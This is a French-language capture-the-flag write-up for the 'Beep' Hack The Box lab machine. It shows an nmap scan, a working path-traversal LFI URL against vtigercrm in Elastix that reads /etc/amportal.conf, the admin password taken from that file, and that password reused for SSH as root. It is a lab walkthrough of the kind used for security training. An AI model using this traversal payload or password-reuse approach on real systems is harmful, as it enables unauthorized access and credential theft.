# Beep [Linux] Easy

`nmap -sS -A -sC -sV -p- 10.10.10.7`

```bash
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey:
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to [https://10.10.10.7/](https://10.10.10.7/)
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|*pop3-capabilities: RESP-CODES APOP STLS PIPELINING EXPIRE(NEVER) AUTH-RESP-CODE IMPLEMENTATION(Cyrus POP3 server v2) USER LOGIN-DELAY(0) TOP UIDL
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            875/udp   status
|*  100024  1            878/tcp   status
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_imap-capabilities: CATENATE SORT=MODSEQ UIDPLUS LIST-SUBSCRIBED SORT OK ACL RIGHTS=kxte CONDSTORE STARTTLS QUOTA MULTIAPPEND Completed LISTEXT CHILDREN IDLE UNSELECT BINARY ATOMIC THREAD=REFERENCES NO THREAD=ORDEREDSUBJECT ID X-NETSCAPE ANNOTATEMORE IMAP4rev1 LITERAL+ NAMESPACE MAILBOX-REFERRALS IMAP4 RENAME URLAUTHA0001
|*ssl-date: ERROR: Script execution failed (use -d to debug)
443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
| http-robots.txt: 1 disallowed entry
|*/
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_http-server-header: Apache/2.2.3 (CentOS)
|_ssl-date: 2022-06-01T15:33:50+00:00; 0s from scanner time.
|_http-title: Elastix - Login page
878/tcp   open  status     1 (RPC #100024)
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
|_ssl-known-key: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
3306/tcp  open  mysql      MySQL (unauthorized)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
4190/tcp  open  sieve      Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
4445/tcp  open  upnotifyp?
4559/tcp  open  hylafax    HylaFAX 4.3.10
5038/tcp  open  asterisk   Asterisk Call Manager 1.1
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-server-header: MiniServ/1.570
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
```

Version :
- Apache httpd 2.2.3
- Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
- HylaFAX 4.3.10
- Asterisk Call Manager 1.1
- MiniServ 1.570 (Webmin httpd)

Avec tous ça on trouve absolument rien. Mais sur le site Web il y a un client Elastix on peux chercher des exploit dessus un des deux exploit est un LFI il consiste à craft une url :

```bash
/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```

On peux se permettre de faire nous même notre URL : [https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf&module=Accounts&action](https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action)

On trouve la variable ARI_ADMIN_PASSWORD=`jEhdIekWmdjE` on peux donc se connecter au client en tant que `admin:jEhdIekWmdjE`

Et on peux remarquer une récurrence des mot de passe qui sont utilisé pour plusieurs services `jEhdIekWmdjE` on peux donc essayer ce mot de passe sur la connexion ssh.

Premier problème la clé ssh est très vielle :

![Untitled](Beep%20%5BLinux%5D%20Easy%2026fb15d625164ea69508a47d026a8231/Untitled.png)

On rajoute à notre commande `-oKexAlgorithms=+diffie-hellman-group-exchange-sha1`

La méthode est trop vielle et on à ce retour :

![Untitled](Beep%20%5BLinux%5D%20Easy%2026fb15d625164ea69508a47d026a8231/Untitled%201.png)

On rajoute cette partie `oHostKeyAlgorithms=+ssh-rsa` et nous pouvons nous connecter avec le mot de passe.

Nous apparaissons directement avec les droits root nous pouvons récupérer tous les flag.